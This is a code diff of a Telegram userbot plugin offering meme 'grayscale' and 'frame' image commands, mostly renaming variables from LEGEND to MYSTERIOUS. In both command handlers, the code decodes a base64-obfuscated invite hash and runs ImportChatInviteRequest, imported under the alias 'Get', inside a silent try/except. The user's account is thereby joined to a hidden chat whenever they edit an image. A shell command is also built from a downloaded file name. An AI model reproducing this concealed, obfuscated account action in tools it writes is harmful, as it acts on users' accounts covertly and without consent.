+        await MYSTERIOUS.edit(
             "Analyzing this media 🧐 zooming this image!"
         )
-        meme_file = LEGENDsticker
+        meme_file = MYSTERIOUSsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await LEGEND.client(san)
+        await MYSTERIOUS.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "grayscale.webp" if legend else "grayscale.jpg"
     try:
-        await crop(meme_file, outputfile, LEGENDinput)
+        await crop(meme_file, outputfile, MYSTERIOUSinput)
     except Exception as e:
-        return await LEGEND.edit(f"`{e}`")
+        return await MYSTERIOUS.edit(f"`{e}`")
     try:
-        await LEGEND.client.send_file(
-            LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
+        await MYSTERIOUS.client.send_file(
+            MYSTERIOUS.chat_id, outputfile, force_document=False, reply_to=MYSTERIOUSid
         )
     except Exception as e:
-        return await LEGEND.edit(f"`{e}`")
-    await LEGEND.delete()
+        return await MYSTERIOUS.edit(f"`{e}`")
+    await MYSTERIOUS.delete()
     os.remove(outputfile)
-    for files in (LEGENDsticker, meme_file):
+    for files in (MYSTERIOUSsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
 
 @MYSTERIOUSBOT.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
 @MYSTERIOUSBOT.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
-async def memes(LEGEND):
-    if LEGEND.fwd_from:
+async def memes(MYSTERIOUS):
+    if MYSTERIOUS.fwd_from:
         return
-    reply = await LEGEND.get_reply_message()
+    reply = await MYSTERIOUS.get_reply_message()
     if not (reply and (reply.media)):
-        await edit_or_reply(LEGEND, "`Reply to supported Media...`")
+        await edit_or_reply(MYSTERIOUS, "`Reply to supported Media...`")
         return
-    LEGENDinput = LEGEND.pattern_match.group(1)
-    if not LEGENDinput:
-        LEGENDinput = 50
-    if ";" in str(LEGENDinput):
-        LEGENDinput, colr = LEGENDinput.split(";", 1)
+    MYSTERIOUSinput = MYSTERIOUS.pattern_match.group(1)
+    if not MYSTERIOUSinput:
+        MYSTERIOUSinput = 50
+    if ";" in str(MYSTERIOUSinput):
+        MYSTERIOUSinput, colr = MYSTERIOUSinput.split(";", 1)
     else:
         colr = 0
-    LEGENDinput = int(LEGENDinput)
+    MYSTERIOUSinput = int(MYSTERIOUSinput)
     colr = int(colr)
-    LEGENDid = LEGEND.reply_to_msg_id
+    MYSTERIOUSid = MYSTERIOUS.reply_to_msg_id
     if not os.path.isdir("./temp/"):
         os.mkdir("./temp/")
-    LEGEND = await edit_or_reply(LEGEND, "`Fetching media data`")
+    MYSTERIOUS = await edit_or_reply(MYSTERIOUS, "`Fetching media data`")
     from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
     await asyncio.sleep(2)
-    LEGENDsticker = await reply.download_media(file="./temp/")
-    if not LEGENDsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
-        os.remove(LEGENDsticker)
-        await edit_or_reply(LEGEND, "```Supported Media not found...```")
+    MYSTERIOUSsticker = await reply.download_media(file="./temp/")
+    if not MYSTERIOUSsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
+        os.remove(MYSTERIOUSsticker)
+        await edit_or_reply(MYSTERIOUS, "```Supported Media not found...```")
         return
     import base64
 
     legend = None
-    if LEGENDsticker.endswith(".tgs"):
-        await LEGEND.edit(
+    if MYSTERIOUSsticker.endswith(".tgs"):
+        await MYSTERIOUS.edit(
             "Analyzing this media 🧐 framing this animated sticker!"
         )
-        LEGENDfile = os.path.join("./temp/", "meme.png")
-        LEGENDcmd = (
-            f"lottie_convert.py --frame 0 -if lottie -of png {LEGENDsticker} {LEGENDfile}"
+        MYSTERIOUSfile = os.path.join("./temp/", "meme.png")
+        MYSTERIOUScmd = (
+            f"lottie_convert.py --frame 0 -if lottie -of png {MYSTERIOUSsticker} {MYSTERIOUSfile}"
         )
-        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found...`")
+        stdout, stderr = (await runcmd(MYSTERIOUScmd))[:2]
+        if not os.path.lexists(MYSTERIOUSfile):
+            await MYSTERIOUS.edit("`Template not found...`")
             LOGS.info(stdout + stderr)
-        meme_file = LEGENDfile
+        meme_file = MYSTERIOUSfile
         legend = True
-    elif LEGENDsticker.endswith(".webp"):
-        await LEGEND.edit(
+    elif MYSTERIOUSsticker.endswith(".webp"):
+        await MYSTERIOUS.edit(
             "Analyzing this media 🧐 framing this sticker!"
         )
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        os.rename(LEGENDsticker, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("`Template not found... `")
+        MYSTERIOUSfile = os.path.join("./temp/", "memes.jpg")
+        os.rename(MYSTERIOUSsticker, MYSTERIOUSfile)
+        if not os.path.lexists(MYSTERIOUSfile):
+            await MYSTERIOUS.edit("`Template not found... `")
             return
-        meme_file = LEGENDfile
+        meme_file = MYSTERIOUSfile
         legend = True
-    elif LEGENDsticker.endswith((".mp4", ".mov")):
-        await LEGEND.edit(
+    elif MYSTERIOUSsticker.endswith((".mp4", ".mov")):
+        await MYSTERIOUS.edit(
             "Analyzing this media 🧐 framing this video!"
         )
-        LEGENDfile = os.path.join("./temp/", "memes.jpg")
-        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
-        if not os.path.lexists(LEGENDfile):
-            await LEGEND.edit("```Template not found...```")
+        MYSTERIOUSfile = os.path.join("./temp/", "memes.jpg")
+        await take_screen_shot(MYSTERIOUSsticker, 0, MYSTERIOUSfile)
+        if not os.path.lexists(MYSTERIOUSfile):
+            await MYSTERIOUS.edit("```Template not found...```")
             return
-        meme_file = LEGENDfile
+        meme_file = MYSTERIOUSfile
     else:
-        await LEGEND.edit(
+        await MYSTERIOUS.edit(
             "Analyzing this media 🧐 framing this image!"
         )
-        meme_file = LEGENDsticker
+        meme_file = MYSTERIOUSsticker
     try:
         san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         san = Get(san)
-        await LEGEND.client(san)
+        await MYSTERIOUS.client(san)
     except BaseException:
         pass
     meme_file = convert_toimage(meme_file)
     outputfile = "framed.webp" if legend else "framed.jpg"
     try:
-        await add_frame(meme_file, outputfile, LEGENDinput, colr)
+        await add_frame(meme_file, outputfile, MYSTERIOUSinput, colr)
     except Exception as e:
-        return await LEGEND.edit(f"`{e}`")
+        return await MYSTERIOUS.edit(f"`{e}`")
     try:
-        await LEGEND.client.send_file(
-            LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
+        await MYSTERIOUS.client.send_file(
+            MYSTERIOUS.chat_id, outputfile, force_document=False, reply_to=MYSTERIOUSid
         )
     except Exception as e:
-        return await LEGEND.edit(f"`{e}`")
-    await LEGEND.delete()
+        return await MYSTERIOUS.edit(f"`{e}`")
+    await MYSTERIOUS.delete()
     os.remove(outputfile)
-    for files in (LEGENDsticker, meme_file):
+    for files in (MYSTERIOUSsticker, meme_file):
         if files and os.path.exists(files):
             os.remove(files)
 
